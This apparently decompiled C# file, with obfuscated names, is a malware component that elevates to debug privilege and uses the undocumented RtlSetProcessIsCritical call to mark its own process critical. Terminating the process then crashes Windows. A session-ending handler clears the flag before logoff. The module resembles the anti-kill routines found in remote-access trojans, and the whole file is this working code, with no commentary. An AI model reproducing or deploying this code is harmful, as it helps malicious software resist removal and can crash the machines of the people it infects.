using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace oiBbJupDERGF;

public static class TIyRHzZTpzmGTup
{
	public static bool hCyuPkKNhtDUAL()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void oxmlPEzDxlbf(object sender, SessionEndingEventArgs e)
	{
		if (hCyuPkKNhtDUAL())
		{
			jSyFNtnUYxGr();
		}
	}

	public static void lODjtaIGKPsBy()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		try
		{
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(oxmlPEzDxlbf));
			Process.EnterDebugMode();
			RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	public static void jSyFNtnUYxGr()
	{
		try
		{
			RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint AlbSXVCQVHZAqxj, uint XqSmJQcbgepFz, uint mogDrYsPfoLA);
}
